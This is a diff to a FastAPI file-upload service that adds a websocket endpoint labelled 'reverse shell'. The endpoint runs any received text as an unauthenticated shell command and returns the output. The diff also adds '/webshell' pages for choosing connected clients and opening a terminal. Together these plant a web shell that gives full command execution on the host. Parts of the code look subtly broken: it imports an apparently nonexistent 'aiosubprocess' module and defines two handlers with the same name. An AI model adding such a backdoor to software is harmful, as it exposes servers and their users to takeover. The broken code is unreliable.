@@ -1,9 +1,12 @@
-from fastapi import FastAPI, File, UploadFile, Request
+from fastapi import FastAPI, File, HTTPException, UploadFile, Request, WebSocket
 from fastapi.responses import HTMLResponse, StreamingResponse
 from gridfs import GridFS
 from pymongo import MongoClient
 from pydantic import BaseModel
 from fastapi.templating import Jinja2Templates
+import aiosubprocess
+import websockets
+import subprocess
 import os
 
 app = FastAPI()
@@ -13,10 +16,16 @@ templates = Jinja2Templates(directory="templates")  # Create a templates directo
 # Initialize the MongoDB client
 client = MongoClient("mongodb://mongo:27017/")
 db = client["mydatabase"]
+connections = db["connections"]
 fs = GridFS(db)
 
 class FileResponse(BaseModel):
     filename: str
+
+# index route
+@app.get('/')
+async def index(request: Request):
+    return templates.TemplateResponse('index.html', {'request': request})
 
 # render the upload form in an HTML template
 @app.post('/upload')
@@ -79,3 +88,31 @@ async def download_file(filename: str):
 
     # Return the file data as a response
     return StreamingResponse(grid_file, media_type='application/octet-stream')
+
+# websocket endpoint for reverse shell
+@app.websocket("/ws/{client_id}")
+async def websocket_endpoint(websocket: WebSocket, client_id: int):
+    if connections.find_one({"client_id": client_id}):
+        raise HTTPException(status_code=400, detail="Client ID is already in use")
+    await websocket.accept()
+    connections.insert_one({"client_id": client_id})
+    try:
+        while True:
+            data = await websocket.receive_text()
+            process = await aiosubprocess.create_subprocess_shell(data, stdout=aiosubprocess.PIPE, stderr=aiosubprocess.PIPE)
+            stdout, stderr = await process.communicate()
+            await websocket.send_text(stdout.decode())
+    except:
+        connections.delete_one({"client_id": client_id})
+
+@app.get('/webshell')
+async def webshell(request: Request):
+    active_connections = [doc["client_id"] for doc in connections.find()]
+    return templates.TemplateResponse('reverse_shell.html', {'request': request, 'active_connections': active_connections})
+
+@app.get('/webshell/{client_id}')
+async def webshell(request: Request, client_id: int):
+    if not connections.find_one({"client_id": client_id}):
+        raise HTTPException(status_code=400, detail="Client ID is not active")
+    return templates.TemplateResponse('terminal.html', {'request': request, 'client_id': client_id})
+
